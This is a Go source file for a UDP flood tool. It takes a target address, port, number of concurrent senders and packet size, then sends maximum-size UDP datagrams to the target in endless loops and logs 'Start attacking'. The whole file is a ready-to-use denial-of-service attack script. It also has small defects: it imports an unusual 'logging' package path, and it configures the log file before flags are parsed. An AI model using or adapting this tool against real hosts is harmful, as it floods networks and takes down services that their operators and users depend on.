package main

import (
	"flag"
	log "logging"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
)

var (
	ip      string
	port    string
	server  string
	clients int
	buff    int
	logPath string
)

func setupFlags() {
	flag.StringVar(&ip, "ip", "127.0.0.1", "Target IP address")
	flag.StringVar(&port, "p", "6001", "Target Port")
	flag.IntVar(&clients, "c", 1, "number of concurrent clients (default 1)")
	flag.StringVar(&logPath, "lp", "./udpFlooding.log", "The path to the log file (default ./client.log)")
	flag.IntVar(&buff, "s", 65507, "The packet size in bytes to send (default 65507)")
}

func setupLogging() {
	logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		log.Println(err)
		return
	}

	log.SetFlags(log.Ldate | log.Lmicroseconds | log.LUTC)
	log.SetOutput(logFile)

}

func setupSignals() {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)

	go func() {
		s := <-sigs
		log.Printf("RECEIVED SIGNAL: %s", s)
		os.Exit(1)
	}()

}

func generateServerAddress() {
	// TODO: Maybe run a check on ip or port
	server = ip + ":" + port
}

func sendBuffer(conn net.Conn, buf []byte, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		conn.Write(buf)
	}
}

func init() {
	/* Setup the input flags
	*
	 */
	setupFlags()

	/* Setup logging
	*
	 */
	setupLogging()

	/* Setup signal catching
	 *
	 */
	setupSignals()
}

func main() {
	flag.Parse()
	var wg sync.WaitGroup

	/* Generate the server address
	*
	 */
	generateServerAddress()
	log.Println("Start attacking", server)
	conn, err := net.Dial("udp", server)
	if err != nil {
		log.Println("There was an error", err)
	}

	buf := make([]byte, buff)

	/* Pararel buffer connections
	*
	 */
	for c := 0; c < clients; c++ {
		wg.Add(1)
		go sendBuffer(conn, buf, &wg)
	}

	wg.Wait()
}
